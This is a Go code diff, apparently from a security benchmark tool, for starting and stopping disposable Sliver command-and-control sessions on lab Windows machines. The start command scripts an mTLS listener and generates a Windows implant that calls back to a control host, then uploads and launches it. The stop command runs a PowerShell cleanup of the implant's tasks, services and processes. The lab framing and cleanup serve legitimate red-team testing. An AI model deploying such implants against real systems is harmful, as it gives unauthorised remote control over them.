@@ -44,7 +44,7 @@ func sliverLabSessionCommand(stdout io.Writer, options *sliverOptions) *cobra.Co
 }
 
 func sliverLabSessionStartCommand(stdout io.Writer, options *sliverOptions) *cobra.Command {
-	var controlName, controlsPath, arch, sessionContext, format string
+	var arch, sessionContext, format string
 	var timeout time.Duration
 	cmd := &cobra.Command{Use: "start", Short: "Generate, launch, and wait for one disposable lab-only session", Args: cobra.NoArgs}
 	cmd.RunE = func(cmd *cobra.Command, _ []string) error {
@@ -59,9 +59,13 @@ func sliverLabSessionStartCommand(stdout io.Writer, options *sliverOptions) *cob
 		if sessionContext != "user" && sessionContext != "system" {
 			return fmt.Errorf("context must be user or system")
 		}
-		config, err := runtimecontrol.Load(controlsPath)
+		config, err := runtimecontrol.Load(options.Controls)
 		if err != nil {
 			return err
+		}
+		controlName := strings.TrimSpace(options.Control)
+		if controlName == "" {
+			controlName = strings.TrimSpace(os.Getenv("BOFBENCH_SLIVER_CONTROL"))
 		}
 		resolvedName, control, err := runtimecontrol.Resolve(config, controlName)
 		if err != nil {
@@ -93,7 +97,9 @@ func sliverLabSessionStartCommand(stdout io.Writer, options *sliverOptions) *cob
 		if err != nil {
 			return err
 		}
-		resolvedOptions, err := resolveSliverOptions(*options, ".", false)
+		resolvedOptions := *options
+		resolvedOptions.Control = resolvedName
+		resolvedOptions, err = resolveSliverOptions(cmd.Context(), resolvedOptions, ".", false)
 		if err != nil {
 			return err
 		}
@@ -121,18 +127,34 @@ func sliverLabSessionStartCommand(stdout io.Writer, options *sliverOptions) *cob
 		if arch == "x86" {
 			sliverArch = "386"
 		}
-		quoted, _ := sliverConsoleQuote(localImplant)
+		clientImplant := localImplant
+		cleanupClientImplant := func() {}
+		if resolvedOptions.RemoteClient != nil {
+			remoteTemp, tempErr := sliverRemoteTempDir(cmd.Context(), resolvedOptions.RemoteClient, "implant")
+			if tempErr != nil {
+				return finish(tempErr)
+			}
+			cleanupClientImplant = func() { cleanupSliverRemoteTemp(resolvedOptions.RemoteClient, remoteTemp) }
+			clientImplant = remoteTemp + "/" + filepath.Base(localImplant)
+		}
+		defer cleanupClientImplant()
+		quoted, _ := sliverConsoleQuote(clientImplant)
 		rc := fmt.Sprintf("mtls --lhost 0.0.0.0 --lport 8888\ngenerate --mtls %s:8888 --os windows --arch %s --format exe --save %s\nexit\n", providerStatus.Resource.GuestIPv4, sliverArch, quoted)
 		generateCtx, generateCancel := context.WithTimeout(cmd.Context(), timeout)
-		output, generateErr := runSliverRCContext(generateCtx, resolvedOptions.Client, rc)
+		output, generateErr := runSliverRCContext(generateCtx, resolvedOptions, rc)
 		generateCancel()
 		if generateErr != nil {
 			return finish(fmt.Errorf("generate disposable Sliver session: %w", generateErr))
 		}
-		if _, statErr := os.Stat(localImplant); statErr != nil {
-			return finish(fmt.Errorf("Sliver did not create %s: %w: %s", localImplant, statErr, strings.TrimSpace(stripANSI(output))))
+		var hash string
+		if resolvedOptions.RemoteClient != nil {
+			hash, err = sliverRemoteSHA256(cmd.Context(), resolvedOptions.RemoteClient, clientImplant)
+		} else {
+			if _, statErr := os.Stat(localImplant); statErr != nil {
+				return finish(fmt.Errorf("Sliver did not create %s: %w: %s", localImplant, statErr, strings.TrimSpace(stripANSI(output))))
+			}
+			hash, err = sha256File(localImplant)
 		}
-		hash, err := sha256File(localImplant)
 		if err != nil {
 			return finish(err)
 		}
@@ -142,7 +164,14 @@ func sliverLabSessionStartCommand(stdout io.Writer, options *sliverOptions) *cob
 		if _, stderr, mkdirErr := lab.ExecutePowerShell(cmd.Context(), remote, `$ErrorActionPreference='Stop'; New-Item -ItemType Directory -Path 'C:\bofbench\sessions' -Force | Out-Null`); mkdirErr != nil {
 			return finish(fmt.Errorf("prepare session directory: %w: %s", mkdirErr, strings.TrimSpace(string(stderr))))
 		}
-		if _, stderr, uploadErr := lab.UploadFile(cmd.Context(), remote, localImplant, remotePath); uploadErr != nil {
+		if resolvedOptions.RemoteClient != nil {
+			transferContext, transferCancel := context.WithTimeout(cmd.Context(), timeout)
+			uploadErr := uploadSliverRemoteFileToLab(transferContext, resolvedOptions.RemoteClient, clientImplant, remote, remotePath)
+			transferCancel()
+			if uploadErr != nil {
+				return finish(uploadErr)
+			}
+		} else if _, stderr, uploadErr := lab.UploadFile(cmd.Context(), remote, localImplant, remotePath); uploadErr != nil {
 			return finish(fmt.Errorf("upload session executable: %w: %s", uploadErr, strings.TrimSpace(string(stderr))))
 		}
 		launch := fmt.Sprintf(`$ErrorActionPreference='Stop'; $path=%s; if((Get-FileHash -Algorithm SHA256 -LiteralPath $path).Hash.ToLower() -ne %s){throw 'session executable hash mismatch'}; `, psLiteral(remotePath), psLiteral(hash))
@@ -176,13 +205,14 @@ func sliverLabSessionStartCommand(stdout io.Writer, options *sliverOptions) *cob
 			}
 		}
 		receipt.Session = session
+		if err := saveActiveSliverSession(activeSliverSession{Lab: resolvedLab.Name, Control: resolvedName, Session: session, ControlHost: providerStatus.Resource.GuestIPv4, ReceiptPath: receipt.ReceiptPath}); err != nil {
+			return finish(fmt.Errorf("publish active Sliver session: %w", err))
+		}
 		if format == "text" {
 			fmt.Fprintf(stdout, "Sliver lab session ready\ncontrol   %s (%s)\nlab       %s (%s)\narch      %s\ncontext   %s\nsession   %s\nreceipt   %s\n", resolvedName, providerStatus.Resource.GuestIPv4, resolvedLab.Name, status.ComputerName, arch, sessionContext, session, receipt.ReceiptPath)
 		}
 		return finish(nil)
 	}
-	cmd.Flags().StringVar(&controlName, "control", "", "runtime control-plane profile")
-	cmd.Flags().StringVar(&controlsPath, "controls", runtimecontrol.Path(), "runtime control profiles file")
 	cmd.Flags().StringVar(&arch, "arch", "x64", "session architecture: x64 or x86")
 	cmd.Flags().StringVar(&sessionContext, "context", "user", "session context: user or system")
 	cmd.Flags().DurationVar(&timeout, "timeout", 3*time.Minute, "live session wait timeout")
@@ -212,7 +242,7 @@ func sliverLabSessionStopCommand(stdout io.Writer, options *sliverOptions) *cobr
 			return err
 		}
 		receipt := sliverLabSessionReceipt{Schema: "bofbench.sliver-lab-session", SchemaVersion: 1, RunID: runlog.ID(runDir), Action: "stop", Lab: resolved.Name, Status: "running", StartedAt: time.Now().UTC().Format(time.RFC3339Nano), ReceiptPath: filepath.Join(runDir, "session.json")}
-		script := `$ErrorActionPreference='Stop'; Get-ScheduledTask -TaskName 'BOFBench-Sliver-*' -ErrorAction SilentlyContinue|ForEach-Object{Stop-ScheduledTask -TaskName $_.TaskName -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}; Get-Service -Name 'BOFBench-Sliver-*' -ErrorAction SilentlyContinue|ForEach-Object{Stop-Service $_.Name -Force -ErrorAction SilentlyContinue; sc.exe delete $_.Name|Out-Null}; Get-CimInstance Win32_Process|Where-Object{$_.ExecutablePath -like 'C:\bofbench\sessions\bofbench-sliver-*.exe'}|ForEach-Object{Stop-Process -Id $_.ProcessId -Force}; Remove-Item -LiteralPath 'C:\bofbench\sessions' -Recurse -Force -ErrorAction SilentlyContinue; $remaining=@(Get-CimInstance Win32_Process|Where-Object{$_.ExecutablePath -like 'C:\bofbench\sessions\*'}).Count; if($remaining -ne 0){throw 'session processes remain'}; [ordered]@{status='complete';remaining=$remaining}|ConvertTo-Json -Compress`
+		script := `$ErrorActionPreference='Stop'; $self=$PID; Get-ScheduledTask -TaskName 'BOFBench-Sliver-*' -ErrorAction SilentlyContinue|ForEach-Object{Stop-ScheduledTask -TaskName $_.TaskName -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}; Get-Service -Name 'BOFBench-Sliver-*' -ErrorAction SilentlyContinue|ForEach-Object{Stop-Service $_.Name -Force -ErrorAction SilentlyContinue; sc.exe delete $_.Name|Out-Null}; Get-CimInstance Win32_Process|Where-Object{$_.ProcessId -ne $self}|ForEach-Object{$candidate=$_.CommandLine; if($_.Name -ieq 'powershell.exe' -and $candidate -match '(?i)-EncodedCommand\s+([A-Za-z0-9+/=]+)'){try{$candidate+=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Matches[1]))}catch{}}; if($_.ExecutablePath -like 'C:\bofbench\sessions\bofbench-sliver-*.exe' -or ($_.Name -ieq 'powershell.exe' -and $candidate -like '*OpenStandardInput*' -and $candidate -like '*bofbench-sliver-*')){Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue}}; for($attempt=0;$attempt -lt 20;$attempt++){Remove-Item -LiteralPath 'C:\bofbench\sessions' -Recurse -Force -ErrorAction SilentlyContinue; if(-not (Test-Path -LiteralPath 'C:\bofbench\sessions')){break}; Start-Sleep -Milliseconds 250}; $remaining=@(Get-CimInstance Win32_Process|Where-Object{$_.ExecutablePath -like 'C:\bofbench\sessions\*'}).Count; $files=@(Get-ChildItem -LiteralPath 'C:\bofbench\sessions' -Force -ErrorAction SilentlyContinue).Count; if($remaining -ne 0 -or $files -ne 0){throw 'session processes or files remain'}; [ordered]@{status='complete';remaining=$remaining;files=$files}|ConvertTo-Json -Compress`
 		output, stderr, runErr := lab.ExecutePowerShell(cmd.Context(), remote, script)
 		receipt.CompletedAt = time.Now().UTC().Format(time.RFC3339Nano)
 		receipt.Status = "complete"
@@ -221,6 +251,13 @@ func sliverLabSessionStopCommand(stdout io.Writer, options *sliverOptions) *cobr
 		}
 		if err := writeJSON(receipt.ReceiptPath, receipt); err != nil && runErr == nil {
 			runErr = err
+		}
+		if runErr == nil {
+			if removeErr := removeActiveSliverSession(resolved.Name); removeErr != nil {
+				runErr = removeErr
+				receipt.Status, receipt.Error = "failed", removeErr.Error()
+				_ = writeJSON(receipt.ReceiptPath, receipt)
+			}
 		}
 		if format == "json" {
 			_ = printJSON(stdout, receipt)
